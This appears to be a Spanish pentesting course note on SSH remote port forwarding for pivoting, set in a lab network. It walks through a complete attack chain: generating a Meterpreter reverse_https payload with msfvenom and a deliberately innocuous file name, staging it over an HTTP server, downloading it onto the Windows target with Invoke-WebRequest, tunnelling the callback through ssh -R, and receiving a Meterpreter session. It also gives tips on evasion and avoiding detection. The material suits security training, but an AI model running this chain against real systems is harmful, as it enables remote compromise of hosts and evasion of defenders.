
## 🧠 Concepto clave

El **remote port forwarding** (también llamado reverse port forwarding) resuelve el problema inverso al local port forwarding: en lugar de traer un servicio remoto hacia el atacante, **expone un puerto del atacante en el host comprometido**. Es la técnica necesaria cuando el objetivo interno (por ejemplo, un host Windows en una red segmentada) necesita conectarse de vuelta al atacante para establecer una reverse shell, pero no tiene ruta directa hacia la red del atacante.

| Modalidad | Flag | Dirección del túnel | Quién inicia la conexión hacia el destino final |
|---|---|---|---|
| Local Port Forwarding | `-L` | Atacante → pivot → servicio interno | El atacante |
| Dynamic Port Forwarding | `-D` | Atacante → pivot → red interna (SOCKS) | El atacante |
| **Remote Port Forwarding** | **`-R`** | **Pivot → atacante ← objetivo interno** | **El objetivo interno** |

El remote port forwarding es imprescindible para obtener reverse shells, sesiones Meterpreter o cualquier conexión de callback desde hosts internos que no tienen visibilidad directa de la red del atacante.

---

## 📌 El problema que resuelve

En el escenario anterior se conseguía RDP al host Windows (`172.16.5.19`) a través del pivot Ubuntu. Pero si se intenta ejecutar un payload de reverse shell en ese Windows, **la conexión de vuelta falla** — el Windows solo tiene rutas hacia `172.16.5.0/23` y no sabe cómo llegar a `10.10.15.x` (la red del atacante).
```
[Atacante 10.10.15.x]  ←  ¿?  ← NO HAY RUTA  ←  [Windows 172.16.5.19]
         ↕ SSH
[Ubuntu pivot 10.129.202.64 / 172.16.5.129]
         ↕ red interna
[Windows 172.16.5.19]
```

La solución: usar el Ubuntu como relay. El payload del Windows apunta al Ubuntu (`172.16.5.129:8080`), y el Ubuntu reenvía esas conexiones al listener del atacante (`0.0.0.0:8000`) a través del túnel SSH inverso.
```
[Windows 172.16.5.19] → [Ubuntu:8080] → [túnel SSH] → [Atacante:8000]
```

---

## 📌 Flujo completo paso a paso

### Paso 1 — Crear el payload con msfvenom apuntando al pivot

> [!info] **msfvenom**
> Herramienta de Metasploit Framework para generar payloads en múltiples formatos (exe, elf, dll, php, py, etc.). Combina la generación de payload (`msfpayload`) y la codificación (`msfencode`) en una sola herramienta. El parámetro `LHOST` define la IP a la que el payload intentará conectarse al ejecutarse — en remote port forwarding, este valor debe ser la IP del pivot host en la red interna, **no** la IP del atacante.

> [!tip] Generar payload Meterpreter HTTPS apuntando al pivot host
> ```bash
> msfvenom -p windows/x64/meterpreter/reverse_https \
>     LHOST=172.16.5.129 \
>     LPORT=8080 \
>     -f exe \
>     -o backupscript.exe
> ```
> `-p windows/x64/meterpreter/reverse_https` — Payload: Meterpreter de 64 bits que conecta de vuelta usando HTTPS. Más evasivo que `reverse_tcp` ya que el tráfico parece HTTPS legítimo.
> `LHOST=172.16.5.129` — IP del pivot host **en la red interna** — la única IP que el Windows puede alcanzar. **No** se pone la IP del atacante.
> `LPORT=8080` — Puerto en el pivot host donde el Windows enviará la conexión de vuelta. SSH escuchará aquí y reenviará al atacante.
> `-f exe` — Formato de salida: ejecutable Windows PE.
> `-o backupscript.exe` — Nombre del archivo de salida. Un nombre genérico reduce las sospechas.

---

### Paso 2 — Configurar el listener en Metasploit

> [!tip] Configurar multi/handler para recibir la sesión Meterpreter
> ```bash
> msfconsole -q
> use exploit/multi/handler
> set payload windows/x64/meterpreter/reverse_https
> set LHOST 0.0.0.0
> set LPORT 8000
> run
> ```
> `set LHOST 0.0.0.0` — Escuchar en **todas las interfaces** del atacante. La conexión llegará desde `127.0.0.1` (loopback local) porque el túnel SSH termina localmente — no se recibe directamente del Windows ni del Ubuntu.
> `set LPORT 8000` — Puerto local del atacante donde MSF escucha. **Diferente** del puerto 8080 del pivot — el túnel SSH conecta estos dos puertos.
> `run` — Inicia el handler. Queda en espera de conexiones entrantes en `0.0.0.0:8000`.

---

### Paso 3 — Transferir el payload al pivot host

> [!tip] Copiar el payload al pivot host usando SCP
> ```bash
> scp backupscript.exe ubuntu@10.129.202.64:~/
> ```
> `scp` — Secure Copy: copia archivos a través de SSH. Usa el mismo canal cifrado que SSH.
> `ubuntu@10.129.202.64:~/` — Usuario, IP del pivot y directorio destino en el pivot (home del usuario ubuntu).

---

### Paso 4 — Servir el payload desde el pivot host

Una vez el payload está en el Ubuntu, se levanta un servidor HTTP temporal para que el Windows pueda descargarlo:

> [!tip] Levantar servidor HTTP en el pivot host para servir el payload
> ```bash
> # En el servidor Ubuntu (sesión SSH o shell)
> python3 -m http.server 8123
> ```
> `-m http.server` — Módulo de Python que levanta un servidor HTTP en el directorio actual.
> `8123` — Puerto donde servirá los archivos. Accesible desde el Windows como `http://172.16.5.129:8123/`.

> [!tip] Descargar el payload en el host Windows objetivo
> ```powershell
> # En el Windows 172.16.5.19
> Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
> ```
> `-Uri` — URL de descarga: IP del Ubuntu (accesible desde el Windows) + puerto del servidor HTTP + nombre del archivo.
> `-OutFile` — Ruta local donde se guardará el ejecutable descargado.

---

### Paso 5 — Establecer el túnel SSH de remote port forwarding

Este es el paso central. Se ejecuta desde el **atacante** y configura el Ubuntu para que escuche en el puerto `8080` y reenvíe todo lo que reciba hacia el listener del atacante en el puerto `8000`:

> [!tip] Crear el túnel SSH de remote port forwarding
> ```bash
> ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@10.129.202.64 -vN
> ```
> `-R 172.16.5.129:8080:0.0.0.0:8000` — Remote port forwarding. Sintaxis: `-R [IP_pivot:]PUERTO_PIVOT:IP_ATACANTE:PUERTO_ATACANTE`. Instruye al SSH server (Ubuntu) a escuchar en `172.16.5.129:8080` y reenviar todo lo que llegue a `0.0.0.0:8000` del atacante (a través del canal SSH).
> `ubuntu@10.129.202.64` — Credenciales y dirección del pivot host.
> `-v` — Verbose: muestra los logs de debug de la conexión SSH, incluyendo los mensajes `client_request_forwarded_tcpip` que confirman que las conexiones del Windows están siendo reenviadas correctamente.
> `-N` — No ejecuta ningún comando remoto — solo establece el túnel. Mantiene la sesión SSH activa sin abrir una shell interactiva.

La sintaxis general del flag `-R` es: `-R [IP_bind:]PUERTO_REMOTO:HOST_DESTINO_LOCAL:PUERTO_DESTINO_LOCAL`

> [!important] Por defecto, SSH solo permite que el remote port forwarding escuche en `127.0.0.1` del servidor remoto, no en otras interfaces. Para que escuche en `172.16.5.129` (accesible desde la red interna), el servidor SSH del Ubuntu debe tener `GatewayPorts yes` en su `/etc/ssh/sshd_config`. Sin esta configuración, el Windows no podrá alcanzar el puerto `8080` del Ubuntu aunque el túnel esté activo.

---

### Paso 6 — Ejecutar el payload en el Windows

Con el túnel activo y el listener de MSF esperando, se ejecuta el payload en el Windows:
```cmd
C:\backupscript.exe
```

El flujo de la conexión es:
```
[Windows:61355] → [Ubuntu:8080] → [túnel SSH cifrado] → [Atacante:8000 → MSF handler]
```

Los logs del SSH verbose confirman el reenvío:
```
debug1: client_request_forwarded_tcpip: listen 172.16.5.129 port 8080, originator 172.16.5.19 port 61355
debug1: channel 1: connected to 0.0.0.0 port 8000
```

El handler de Metasploit recibe la conexión desde `127.0.0.1` (el túnel SSH termina localmente) y abre la sesión Meterpreter:
```
[*] Meterpreter session 1 opened (127.0.0.1:8000 -> 127.0.0.1) at 2022-03-02 10:48:10
```

---

## 📌 Diagrama de flujo completo
```
[ATACANTE 10.10.15.x]
│  msfconsole listener :8000
│  ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@Ubuntu
│
│  ←── túnel SSH cifrado ──────────────────────┐
│                                               │
[UBUNTU PIVOT 10.129.202.64 / 172.16.5.129]    │
│  SSH escucha en 172.16.5.129:8080             │
│  Reenvía conexiones → atacante:8000 ──────────┘
│
│  ←── red interna 172.16.5.0/23 ──────────────┐
│                                               │
[WINDOWS 172.16.5.19]
   payload apunta a 172.16.5.129:8080
   ejecuta backupscript.exe → conecta al Ubuntu
```

---

## 🔗 Relaciones / Contexto

El remote port forwarding con SSH es la técnica fundamental para obtener reverse shells desde hosts internos segmentados cuando se dispone de acceso SSH al pivot host. Es el complemento directo del local port forwarding y el dynamic port forwarding — juntos, las tres modalidades de SSH cubren prácticamente todos los escenarios de pivoting en engagements reales. La combinación concreta de este flujo — `msfvenom` apuntando al pivot + `ssh -R` para el reenvío + `multi/handler` en el atacante — es un patrón estándar del eCPPT y de evaluaciones de Active Directory donde los hosts internos no tienen salida directa a Internet. Comparado con chisel o socat, SSH remote port forwarding no requiere subir ninguna herramienta adicional al pivot host, lo que lo hace preferible cuando la superficie de detección debe ser mínima.